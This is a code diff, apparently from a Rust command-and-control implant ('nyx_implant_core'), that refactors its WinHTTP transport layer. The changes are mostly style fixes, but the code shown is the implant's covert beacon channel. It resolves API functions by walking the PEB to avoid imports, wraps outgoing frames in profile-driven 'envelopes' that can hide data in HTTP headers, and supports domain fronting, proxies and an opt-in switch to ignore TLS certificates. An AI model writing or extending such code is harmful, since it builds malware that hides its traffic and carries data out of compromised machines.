@@ -92,6 +92,9 @@ struct WinhttpFns {
     set_timeouts: Option<FSetTimeouts>,
 }
 
+// Win32 handle type name kept verbatim from winhttp.h for greppability
+// against the API docs — clippy's acronym style would rename it `Hinternet`.
+#[allow(clippy::upper_case_acronyms)]
 type HINTERNET = *mut c_void;
 type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
 /// BOOL WinHttpSetTimeouts(HINTERNET, int resolve, int connect, int send, int receive)
@@ -126,6 +129,10 @@ type FAddReqHeaders = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32)
 static WINHTTP: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
 
 /// Resolve the WinHTTP function table once (no allocation).
+///
+/// # Safety
+/// Force-loads `winhttp.dll` and resolves its exports via PEB walk; installs
+/// transmuted function pointers into a process-lifetime static (Win32 x64 ABI).
 pub unsafe fn ensure_winhttp() {
     use core::sync::atomic::Ordering;
     // Fast path: already attempted (success or failure).
@@ -189,27 +196,18 @@ unsafe fn ensure_winhttp_resolve() -> Option<alloc::boxed::Box<WinhttpFns>> {
         (o, c, r, s, v, d, cl, q)
     {
         Some(alloc::boxed::Box::new(WinhttpFns {
-            open: core::mem::transmute(o),
-            connect: core::mem::transmute(c),
-            open_request: core::mem::transmute(r),
+            open: core::mem::transmute::<usize, FOpen>(o),
+            connect: core::mem::transmute::<usize, FConnect>(c),
+            open_request: core::mem::transmute::<usize, FOpenReq>(r),
             // set_option may be None — handled in post_frame (only called for TLS).
-            set_option: match so {
-                Some(a) => Some(core::mem::transmute(a)),
-                None => None,
-            },
-            send_request: core::mem::transmute(s),
-            receive_response: core::mem::transmute(v),
-            read_data: core::mem::transmute(d),
-            close_handle: core::mem::transmute(cl),
-            query_data: core::mem::transmute(q),
-            add_request_headers: match arh {
-                Some(a) => Some(core::mem::transmute(a)),
-                None => None,
-            },
-            set_timeouts: match st {
-                Some(a) => Some(core::mem::transmute(a)),
-                None => None,
-            },
+            set_option: so.map(|a| core::mem::transmute::<usize, FSetOption>(a)),
+            send_request: core::mem::transmute::<usize, FSendReq>(s),
+            receive_response: core::mem::transmute::<usize, FRecvResp>(v),
+            read_data: core::mem::transmute::<usize, FReadData>(d),
+            close_handle: core::mem::transmute::<usize, FClose>(cl),
+            query_data: core::mem::transmute::<usize, FQueryData>(q),
+            add_request_headers: arh.map(|a| core::mem::transmute::<usize, FAddReqHeaders>(a)),
+            set_timeouts: st.map(|a| core::mem::transmute::<usize, FSetTimeouts>(a)),
         }))
     } else {
         None
@@ -245,6 +243,10 @@ fn to_utf16(s: &[u8]) -> Vec<u16> {
 /// errors are HARD FAILURES (returns None — operators MUST use valid CA-signed
 /// certs or domain fronting). The legacy cert-ignore retry (via WinHttpSetOption)
 /// is opt-in: set `NYX_TLS_INSECURE=1` at build time.
+///
+/// # Safety
+/// Invokes WinHTTP function pointers resolved via PEB walk; `host`/`path`/`body`
+/// must be valid buffers (host/path are ASCII).
 pub unsafe fn post_frame(
     host: &[u8],
     port: u16,
@@ -252,23 +254,11 @@ pub unsafe fn post_frame(
     body: &[u8],
     use_tls: bool,
 ) -> Option<Vec<u8>> {
-    let fns = match post_frame_fns() {
-        Some(f) => f,
-        None => return None,
-    };
+    let fns = post_frame_fns()?;
     let ua = post_frame_user_agent();
-    let session = match post_frame_open_session(fns, &ua) {
-        Some(s) => s,
-        None => return None,
-    };
-    let conn = match post_frame_connect(fns, session, host, port) {
-        Some(c) => c,
-        None => return None,
-    };
-    let req = match post_frame_open_request(fns, session, conn, path, use_tls) {
-        Some(r) => r,
-        None => return None,
-    };
+    let session = post_frame_open_session(fns, &ua)?;
+    let conn = post_frame_connect(fns, session, host, port)?;
+    let req = post_frame_open_request(fns, session, conn, path, use_tls)?;
     post_frame_disable_redirects(fns, req);
     let (cheaders, wire_body, data_header) = post_frame_shape_envelope(body);
     if !post_frame_add_headers(fns, req, &cheaders, &data_header) {
@@ -288,10 +278,7 @@ pub unsafe fn post_frame(
         close_winhttp_chain(fns, req, conn, session);
         return None;
     }
-    let out = match post_frame_read_response(fns, req, conn, session) {
-        Some(o) => o,
-        None => return None,
-    };
+    let out = post_frame_read_response(fns, req, conn, session)?;
     post_frame_finish(fns, req, conn, session, out)
 }
 
@@ -409,22 +396,23 @@ unsafe fn post_frame_disable_redirects(fns: &WinhttpFns, req: HINTERNET) {
     }
 }
 
+/// Profile-declared static client-block headers as (name, value) pairs.
+type StaticHeaders = nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>;
+/// Header-terminator payload: (header name, encoded frame bytes) when the
+/// profile's client-block terminator moves the frame into a header instead of
+/// the wire body.
+type DataHeader = Option<(Vec<u8>, Vec<u8>)>;
+
 /// Envelope shaping (profile-driven, done BEFORE send): encode the body via
 /// the client steps, and when the client-block terminator is a header, move
 /// the encoded bytes into a data header instead of the wire body.
-fn post_frame_shape_envelope(
-    body: &[u8],
-) -> (
-    nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>,
-    Vec<u8>,
-    Option<(Vec<u8>, Vec<u8>)>,
-) {
+fn post_frame_shape_envelope(body: &[u8]) -> (StaticHeaders, Vec<u8>, DataHeader) {
     // ---- Envelope shaping (profile-driven, done BEFORE send) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
     let cheaders = crate::envelopes::post_client_headers();
     let shaped = nyx_profile::encode(&csteps, body);
-    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
+    let (wire_body, data_header): (Vec<u8>, DataHeader) = match &cterm {
         Some(nyx_profile::Terminator::Header(name)) => {
             (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
         }
@@ -668,6 +656,10 @@ pub struct HttpOpts<'a> {
 /// fronting Host header must be set BEFORE the request is sent — they can't
 /// be bolted on after. The envelope shaping, TLS cert handling, and response
 /// reading logic mirror `post_frame` exactly.
+///
+/// # Safety
+/// Invokes WinHTTP function pointers resolved via PEB walk;
+/// `connect_host`/`path`/`body` must be valid buffers (host/path are ASCII).
 pub unsafe fn post_frame_enhanced(
     connect_host: &[u8],
     port: u16,
@@ -676,23 +668,11 @@ pub unsafe fn post_frame_enhanced(
     use_tls: bool,
     opts: &HttpOpts<'_>,
 ) -> Option<Vec<u8>> {
-    let fns = match post_frame_fns() {
-        Some(f) => f,
-        None => return None,
-    };
+    let fns = post_frame_fns()?;
     let ua = post_frame_enhanced_user_agent();
-    let session = match post_frame_enhanced_open_session(fns, &ua, opts.proxy_url) {
-        Some(s) => s,
-        None => return None,
-    };
-    let conn = match post_frame_enhanced_connect(fns, session, connect_host, port) {
-        Some(c) => c,
-        None => return None,
-    };
-    let req = match post_frame_enhanced_open_request(fns, session, conn, path, use_tls) {
-        Some(r) => r,
-        None => return None,
-    };
+    let session = post_frame_enhanced_open_session(fns, &ua, opts.proxy_url)?;
+    let conn = post_frame_enhanced_connect(fns, session, connect_host, port)?;
+    let req = post_frame_enhanced_open_request(fns, session, conn, path, use_tls)?;
     post_frame_enhanced_disable_redirects(fns, req);
     let (cheaders, wire_body, data_header) = post_frame_enhanced_shape_envelope(body);
     if !post_frame_enhanced_add_headers(fns, req, &cheaders, &data_header, opts.fronting_host) {
@@ -711,10 +691,7 @@ pub unsafe fn post_frame_enhanced(
         close_winhttp_chain(fns, req, conn, session);
         return None;
     }
-    let out = match post_frame_enhanced_read_response(fns, req, conn, session) {
-        Some(o) => o,
-        None => return None,
-    };
+    let out = post_frame_enhanced_read_response(fns, req, conn, session)?;
     post_frame_finish(fns, req, conn, session, out)
 }
 
@@ -836,19 +813,13 @@ unsafe fn post_frame_enhanced_disable_redirects(fns: &WinhttpFns, req: HINTERNET
 }
 
 /// Envelope shaping (same as post_frame).
-fn post_frame_enhanced_shape_envelope(
-    body: &[u8],
-) -> (
-    nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>,
-    Vec<u8>,
-    Option<(Vec<u8>, Vec<u8>)>,
-) {
+fn post_frame_enhanced_shape_envelope(body: &[u8]) -> (StaticHeaders, Vec<u8>, DataHeader) {
     // ---- Envelope shaping (same as post_frame) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
     let cheaders = crate::envelopes::post_client_headers();
     let shaped = nyx_profile::encode(&csteps, body);
-    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
+    let (wire_body, data_header): (Vec<u8>, DataHeader) = match &cterm {
         Some(nyx_profile::Terminator::Header(name)) => {
             (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
         }
